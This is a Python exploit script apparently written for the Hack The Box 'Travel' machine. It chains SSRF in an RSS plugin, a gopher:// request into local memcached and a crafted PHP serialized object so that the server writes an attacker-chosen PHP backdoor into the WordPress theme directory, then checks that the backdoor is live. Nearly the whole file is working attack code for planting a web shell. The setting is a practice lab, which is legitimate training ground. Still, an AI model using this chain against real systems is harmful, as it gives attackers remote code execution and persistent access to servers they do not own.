#!/usr/bin/env python3
from urllib import parse
from pwn import *
from requests import *

# variables
fileN = input(str("Enter the backdoor name .php > "))
commandN = input(str("Enter the php command >"))
key = "xct_4e5612ba079c530a6b1f148c0b352241"

# object creation
obj ='O:14:"TemplateHelper":2:{s:4:"file";s:'+str(len(fileN))+':"'+fileN+'";s:4:"data";s:'+str(len(commandN))+':"'+commandN+'";}'
length = len(obj)
log.warning("PHP Object Created with length {}".format(length))

# gopher url
log.info("gopher url generated")
gopherurl = "%0d%0aset {} 4 0 {}%0d%0a{}%0d%0a".format(key,length,obj)
log.info ("attempting SSRF")

# replacing url characters cause might result in double url encoding which causes to fail the exploit
# ssrf_url = "gopher://127.00.0.1:11211/_"+parse.quote(gopherurl)
ssrf_url = "gopher://127.00.0.1:11211/_"+parse.quote(gopherurl).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")


# making request to the awesome-rss with customurl set
#make = "http://blog.travel.htb/awesome-rss/?debug=yes&custom_feed_url="+ssrf_url

make = "http://blog.travel.htb/awesome-rss/?custom_feed_url="+ssrf_url
log.info("performing request on {}".format(make))
r = get(make)
if r.status_code == 200:
    log.info("Successfully made the request")
    log.info("Reloading contents")
    req = get("http://blog.travel.htb/awesome-rss/")
    if req.status_code == 200:
        log.warning("looking for backdoor")
        door = "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/"+fileN
        back = get(door)
        if back.status_code == 200:
            log.success("{} found".format(fileN))
            log.success("Backdoor location: {} \n".format(door))
        else:
            log.failure("backdoor not found, server with the status code '{}'".format(back.status_code))
    else:
        log.failure("Connection to refresh failed: {}".format(req.status_code))


###
# Logs
# - Observed changes when using rawurlencode(), changes occured ".Template.file & .Template.data" - [x]
# - Changed the change and looked no good result - [x]
# - Add feed url and change the xct_ cache according to that - [ongoing]
###
